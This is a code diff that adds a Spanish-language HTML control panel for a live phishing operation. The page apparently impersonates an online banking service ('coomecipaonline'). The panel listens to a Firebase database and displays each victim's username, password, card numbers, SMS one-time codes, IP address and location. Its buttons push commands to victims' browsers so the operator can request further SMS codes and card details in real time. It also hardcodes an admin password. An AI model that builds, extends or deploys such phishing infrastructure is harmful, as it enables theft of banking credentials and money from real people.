@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>JS C0D3R - PANEL</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        #admin-panel { display: none; }
+        #auth-screen { display: flex; }
+        .data-label { font-size: 10px; text-transform: uppercase; color: #9ca3af; font-weight: 700; margin-bottom: 2px; }
+        .data-value { font-weight: 600; word-break: break-all; margin-bottom: 8px; line-height: 1.2; }
+        .sms-pulse { animation: pulse-yellow 2s infinite; }
+        .reentry-pulse { animation: pulse-red 1.5s infinite; }
+        @keyframes pulse-yellow {
+            0%, 100% { background-color: #fef9c3; }
+            50% { background-color: #fde047; }
+        }
+        @keyframes pulse-red {
+            0%, 100% { background-color: #fee2e2; border-color: #ef4444; }
+            50% { background-color: #fecaca; border-color: #b91c1c; }
+        }
+
+        /* FUERZA LA VISIBILIDAD DE LOS BOTONES INDEPENDIENTE DE TAILWIND */
+        .btn-panel {
+            display: block !important;
+            width: 100% !important;
+            padding: 8px !important;
+            color: #ffffff !important;
+            font-weight: bold !important;
+            font-size: 10px !important;
+            text-transform: uppercase !important;
+            border-radius: 8px !important;
+            cursor: pointer !important;
+            text-align: center !important;
+            border: none !important;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1) !important;
+            transition: background 0.2s ease !important;
+        }
+        .btn-amber { background-color: #f59e0b !important; }
+        .btn-amber:hover { background-color: #d97706 !important; }
+        .btn-orange { background-color: #ea580c !important; }
+        .btn-orange:hover { background-color: #c2410c !important; }
+        .btn-purple { background-color: #9333ea !important; }
+        .btn-purple:hover { background-color: #7e22ce !important; }
+        .btn-slate { background-color: #334155 !important; }
+        .btn-slate:hover { background-color: #0f172a !important; }
+    </style>
+    <style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #000;--tw-ring-shadow:0 0 #000;--tw-shadow:0 0 #000;--tw-shadow-colored:0 0 #000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #000;--tw-ring-shadow:0 0 #000;--tw-shadow:0 0 #000;--tw-shadow-colored:0 0 #000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.sticky{position:sticky}.inset-0{inset:0px}.top-0{top:0px}.right-2{right:0.5rem}.top-2{top:0.5rem}.z-50{z-index:50}.z-\[100\]{z-index:100}.mx-auto{margin-left:auto;margin-right:auto}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mt-3{margin-top:0.75rem}.mb-3{margin-bottom:0.75rem}.mt-4{margin-top:1rem}.flex{display:flex}.grid{display:grid}.hidden{display:none}.h-2{height:0.5rem}.w-96{width:24rem}.w-full{width:100%}.w-2{width:0.5rem}.max-w-7xl{max-width:80rem}.flex-1{flex:1 1 0%}@keyframes pulse{50%{opacity:.5}}.animate-pulse{animation:pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite}.grid-cols-1{grid-template-columns:repeat(1, minmax(0, 1fr))}.grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-4{gap:1rem}.gap-6{gap:1.5rem}.gap-1{gap:0.25rem}.gap-2{gap:0.5rem}.space-y-1 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.25rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.25rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.rounded-2xl{border-radius:1rem}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded{border-radius:0.25rem}.rounded-xl{border-radius:0.75rem}.border{border-width:1px}.border-2{border-width:2px}.border-b{border-bottom-width:1px}.border-t-8{border-top-width:8px}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-indigo-500{--tw-border-opacity:1;border-color:rgb(99 102 241 / var(--tw-border-opacity, 1))}.border-yellow-500{--tw-border-opacity:1;border-color:rgb(234 179 8 / var(--tw-border-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-gray-800{--tw-bg-opacity:1;background-color:rgb(31 41 55 / var(--tw-bg-opacity, 1))}.bg-indigo-600{--tw-bg-opacity:1;background-color:rgb(79 70 229 / var(--tw-bg-opacity, 1))}.bg-indigo-700{--tw-bg-opacity:1;background-color:rgb(67 56 202 / var(--tw-bg-opacity, 1))}.bg-indigo-800{--tw-bg-opacity:1;background-color:rgb(55 48 163 / var(--tw-bg-opacity, 1))}.bg-indigo-900{--tw-bg-opacity:1;background-color:rgb(49 46 129 / var(--tw-bg-opacity, 1))}.bg-rose-600{--tw-bg-opacity:1;background-color:rgb(225 29 72 / var(--tw-bg-opacity, 1))}.bg-slate-900{--tw-bg-opacity:1;background-color:rgb(15 23 42 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-amber-500{--tw-bg-opacity:1;background-color:rgb(245 158 11 / var(--tw-bg-opacity, 1))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-green-500{--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity, 1))}.bg-slate-700{--tw-bg-opacity:1;background-color:rgb(51 65 85 / var(--tw-bg-opacity, 1))}.bg-yellow-50{--tw-bg-opacity:1;background-color:rgb(254 252 232 / var(--tw-bg-opacity, 1))}.p-3{padding:0.75rem}.p-4{padding:1rem}.p-6{padding:1.5rem}.p-8{padding:2rem}.p-2{padding:0.5rem}.p-5{padding:1.25rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-4{padding-left:1rem;padding-right:1rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.px-2{padding-left:0.5rem;padding-right:0.5rem}.pb-1{padding-bottom:0.25rem}.text-center{text-align:center}.font-mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.text-3xl{font-size: 24px;line-height:2.25rem}.text-\[10px\]{font-size:10px}.text-\[8px\]{font-size:8px}.text-\[9px\]{font-size:9px}.font-bold{font-weight:700}.font-black{font-weight:900}.uppercase{text-transform:uppercase}.italic{font-style:italic}.tracking-tighter{letter-spacing:-0.05em}.tracking-\[0\.5em\]{letter-spacing:0.5em}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-indigo-200{--tw-text-opacity:1;color:rgb(199 210 254 / var(--tw-text-opacity, 1))}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-blue-700{--tw-text-opacity:1;color:rgb(29 78 216 / var(--tw-text-opacity, 1))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-orange-500{--tw-text-opacity:1;color:rgb(249 115 22 / var(--tw-text-opacity, 1))}.text-rose-600{--tw-text-opacity:1;color:rgb(225 29 72 / var(--tw-text-opacity, 1))}.text-yellow-800{--tw-text-opacity:1;color:rgb(133 77 14 / var(--tw-text-opacity, 1))}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgb(0 0 0 / 0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-inner{--tw-shadow:inset 0 2px 4px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:inset 0 2px 4px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-sm{--tw-shadow:0 1px 2px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition{transition-property:color, background-color, border-color, fill, stroke, opacity, box-shadow, transform, filter, -webkit-text-decoration-color, -webkit-backdrop-filter;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter, -webkit-text-decoration-color, -webkit-backdrop-filter;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:bg-black:hover{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.hover\:bg-indigo-700:hover{--tw-bg-opacity:1;background-color:rgb(67 56 202 / var(--tw-bg-opacity, 1))}.hover\:bg-rose-700:hover{--tw-bg-opacity:1;background-color:rgb(190 18 60 / var(--tw-bg-opacity, 1))}.hover\:bg-amber-600:hover{--tw-bg-opacity:1;background-color:rgb(217 119 6 / var(--tw-bg-opacity, 1))}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241 / var(--tw-ring-opacity, 1))}@media (min-width: 768px){.md\:grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}}@media (min-width: 1024px){.lg\:grid-cols-3{grid-template-columns:repeat(3, minmax(0, 1fr))}}
+    </style>
+</head>
+<body class="bg-gray-100">
+
+    <div id="auth-screen" class="fixed inset-0 bg-slate-900 flex items-center justify-center z-[100]">
+        <div class="bg-white p-8 rounded-2xl shadow-2xl w-96 text-center">
+            <h2 class="text-2xl font-bold mb-6 text-gray-800">🔐 Acceso Master</h2>
+            <input type="password" id="admin-pass" placeholder="Contraseña" 
+                   class="w-full p-3 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-indigo-500">
+            <button onclick="verificarAcceso()" 
+                    class="w-full bg-indigo-600 text-white font-bold py-3 rounded-lg hover:bg-indigo-700 transition">
+                Acceder al Panel
+            </button>
+            <p id="auth-error" class="text-red-500 text-sm mt-3 hidden">Credencial Inválida</p>
+        </div>
+    </div>
+
+    <div id="admin-panel">
+        <nav class="bg-indigo-800 p-4 text-white flex justify-between items-center shadow-lg sticky top-0 z-50">
+            <div class="flex items-center gap-4">
+                <h1 class="text-xl font-bold italic tracking-tighter">JS C0D3R - PANEL</h1>
+                <div class="text-xs bg-indigo-900 px-3 py-1 rounded-full text-indigo-200">
+                    Auto-refresco en: <span id="timer">10</span>s
+                </div>
+            </div>
+            <div class="flex items-center gap-4">
+                <div class="bg-indigo-700 px-4 py-2 rounded-lg font-mono text-sm">
+                    USUARIOS: <span id="total-count">0</span>
+                </div>
+                <button onclick="borrarTodo()" class="bg-rose-600 hover:bg-rose-700 px-4 py-2 rounded-lg text-sm font-bold transition" style="color:white; padding:8px 16px; border-radius:8px;">🗑️ Limpiar Todo</button>
+                <button onclick="cerrarSesion()" class="bg-gray-800 hover:bg-black px-4 py-2 rounded-lg text-sm font-bold transition" style="color:white; padding:8px 16px; border-radius:8px;">🚪 Salir</button>
+            </div>
+        </nav>
+        <div class="max-w-7xl mx-auto p-6">
+            <div id="users-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+        </div>
+    </div>
+
+    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+    <script>
+        const CLAVE_MAESTRA = "Cabimas01"; 
+        const firebaseConfig = { databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        let idsConocidos = new Set(); 
+        let ultimoSmsRegistrado = {}; 
+        let ultimaFechaLogin = {}; 
+        let primeraCarga = true;
+
+        let countTimer = 10;
+        setInterval(() => {
+            countTimer--;
+            document.getElementById('timer').innerText = countTimer;
+            if (countTimer <= 0) {
+                location.reload();
+            }
+        }, 1000);
+
+        function sonarAlerta() {
+            const sound = document.getElementById('notif-sound');
+            if (sound) {
+                sound.currentTime = 0;
+                sound.play().catch(() => {});
+            }
+        }
+
+        function verificarAcceso() {
+            const pass = document.getElementById('admin-pass').value;
+            if (pass === CLAVE_MAESTRA) {
+                sessionStorage.setItem('admin_auth', 'true');
+                mostrarPanel();
+            } else {
+                document.getElementById('auth-error').classList.remove('hidden');
+            }
+        }
+
+        function mostrarPanel() {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'block';
+            iniciarEscuchaFirebase();
+        }
+
+        function cerrarSesion() {
+            sessionStorage.removeItem('admin_auth');
+            location.reload();
+        }
+
+        if (sessionStorage.getItem('admin_auth') === 'true') {
+            mostrarPanel();
+        }
+
+        function iniciarEscuchaFirebase() {
+            db.ref('logins').on('value', (snapshot) => {
+                const container = document.getElementById('users-container');
+                container.innerHTML = ''; 
+                let count = 0;
+
+                snapshot.forEach((child) => {
+                    const id = child.key;
+                    const data = child.val();
+                    if (!data.user) return;
+                    count++;
+
+                    if (!idsConocidos.has(id)) {
+                        if (!primeraCarga) sonarAlerta();
+                        idsConocidos.add(id);
+                    }
+
+                    if (data.sms && ultimoSmsRegistrado[id] !== data.sms) {
+                        if (!primeraCarga) sonarAlerta();
+                        ultimoSmsRegistrado[id] = data.sms;
+                    }
+
+                    let avisoReingreso = "";
+                    if (ultimaFechaLogin[id] && ultimaFechaLogin[id] !== data.fecha) {
+                        avisoReingreso = `
+                            <div class="mt-2 p-2 rounded border-2 border-red-500 reentry-pulse text-red-700 text-[10px] font-black text-center">
+                                ⚠️ EL USUARIO VOLVIÓ A ENVIAR DATOS
+                            </div>`;
+                        if (!primeraCarga) sonarAlerta();
+                    }
+                    ultimaFechaLogin[id] = data.fecha;
+
+                    let actividad = "Indeterminado";
+                    let actividadColor = "text-gray-500";
+                    
+                    if (data.status === 'PENDIENTE_SMS') {
+                        actividad = "⏳ ESPERANDO SMS (TOKEN)";
+                        actividadColor = "text-orange-500 font-bold";
+                    } else if (data.status === 'PENDIENTE_SMS_2') {
+                        actividad = "⏳ ESPERANDO SMS 2 (INVÁLIDO)";
+                        actividadColor = "text-amber-600 font-bold";
+                    } else if (data.status === 'PENDIENTE_TARJETA') {
+                        actividad = "💳 SOLICITANDO TARJETA";
+                        actividadColor = "text-purple-600 font-bold";
+                    } else if (data.status === 'SMS_ENTREGADO') {
+                        actividad = "✅ CÓDIGO INGRESADO";
+                        actividadColor = "text-green-600";
+                    } else {
+                        actividad = "✍️ INGRESANDO CREDENCIALES";
+                    }
+
+                    const statusColor = data.online === true ? 'bg-green-500' : 'bg-red-500';
+
+                    container.innerHTML += `
+                        <div class="bg-white rounded-xl shadow-lg p-5 border-t-8 border-indigo-500 relative overflow-hidden">
+                            <div class="absolute top-2 right-2 flex items-center gap-1">
+                                <span class="h-2 w-2 rounded-full ${statusColor} animate-pulse"></span>
+                                <span class="text-[8px] font-bold text-gray-400">${data.online ? 'LIVE' : 'OFF'}</span>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <div class="data-label">Estado actual:</div>
+                                <div class="text-xs font-bold ${actividadColor} uppercase">${actividad}</div>
+                            </div>
+
+                            ${avisoReingreso}
+
+                            <p class="text-[9px] text-gray-400 font-mono mb-3">ID: ${id}</p>
+                            
+                            <div class="space-y-1">
+                                <div class="flex justify-between border-b pb-1">
+                                    <span class="data-label">Usuario</span>
+                                    <span class="data-value text-blue-700">${data.user}</span>
+                                </div>
+                                <div class="flex justify-between border-b pb-1">
+                                    <span class="data-label">Contraseña</span>
+                                    <span class="data-value text-rose-600 font-black">${data.Clave}</span>
+                                </div>
+                                <div class="flex justify-between border-b pb-1">
+                                    <span class="data-label">Tarjeta</span>
+                                    <span class="data-value text-purple-700 font-mono">${data.tarjeta || 'No enviada'}</span>
+                                </div>
+                                <div class="flex justify-between border-b pb-1">
+                                    <span class="data-label">Tarjeta 2</span>
+                                    <span class="data-value text-purple-700 font-mono">${data.tarjeta2 || 'No enviada'}</span>
+                                </div>
+                            </div>
+
+                            ${data.token ? `
+                                <div class="mt-4 p-3 rounded-lg border-2 border-yellow-500 bg-yellow-50 sms-pulse shadow-inner">
+                                    <div class="data-label text-yellow-800 text-center">📩 SMS</div>
+                                    <div class="text-3xl font-black text-center tracking-[0.5em] text-gray-800">${data.token}</div>
+                                </div>
+                            ` : ''}
+                            ${data.sms2 ? `
+                                <div class="mt-4 p-3 rounded-lg border-2 border-yellow-500 bg-yellow-50 sms-pulse shadow-inner">
+                                    <div class="data-label text-yellow-800 text-center">📩 SMS 2</div>
+                                    <div class="text-3xl font-black text-center tracking-[0.5em] text-gray-800">${data.sms2}</div>
+                                </div>
+                            ` : ''}
+
+                            <div class="mt-4 grid grid-cols-2 gap-2">
+                                <div class="bg-gray-50 p-2 rounded">
+                                    <div class="data-label">Dirección IP</div>
+                                    <div class="text-[10px] font-mono text-gray-600">${data.ip || '0.0.0.0'}</div>
+                                </div>
+                                <div class="bg-gray-50 p-2 rounded">
+                                    <div class="data-label">Ubicación</div>
+                                    <div class="text-[10px] text-gray-600 truncate">${data.ubicacion || 'Desconocida'}</div>
+                                </div>
+                            </div>
+
+                            <!-- CONTENEDOR DE BOTONES REPARADO -->
+                            <div class="space-y-2 mt-4">
+                                <div class="flex gap-2">
+                                    <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="btn-panel btn-amber">SOLICITAR SMS</button>
+                                    <button onclick="enviarOrden('${id}', 'pedir_codigo_2')" class="btn-panel btn-orange">SOLICITAR SMS 2</button>
+                                </div>
+                                <div class="flex gap-2">
+                                    <button onclick="enviarOrden('${id}', 'pedir_tarjeta')" class="btn-panel btn-purple">SOLICITAR TARJETA</button>
+                                    <button onclick="enviarOrden('${id}', 'pedir_tarjeta2')" class="btn-panel btn-purple">SOLICITAR TARJETA 2</button>
+                                    <button onclick="enviarOrden('${id}', 'rechazar')" class="btn-panel btn-slate">RECHAZAR</button>
+                                </div>
+                            </div>
+                        </div>`;
+                });
+                document.getElementById('total-count').innerText = count;
+                primeraCarga = false;
+            });
+        }
+
+        function enviarOrden(id, accion) {
+            console.log("Enviando orden:", accion, "al ID:", id); // Control en Consola
+            
+            if (accion === 'pedir_codigo') {
+                db.ref('logins/' + id).update({ status: 'PENDIENTE_SMS', sms: null });
+            } else if (accion === 'pedir_codigo_2') {
+                db.ref('logins/' + id).update({ status: 'PENDIENTE_SMS_2', sms: null });
+            } else if (accion === 'pedir_tarjeta') {
+                db.ref('logins/' + id).update({ status: 'PENDIENTE_TARJETA' });
+            }
+            
+            db.ref('comandos/' + id).set({ accion: accion });
+        }
+
+        function borrarTodo() {
+            if (confirm('⚠️ ¿ESTÁS SEGURO? Se borrarán todos los registros de la base de datos.')) {
+                db.ref('logins').remove();
+                db.ref('comandos').remove();
+                location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
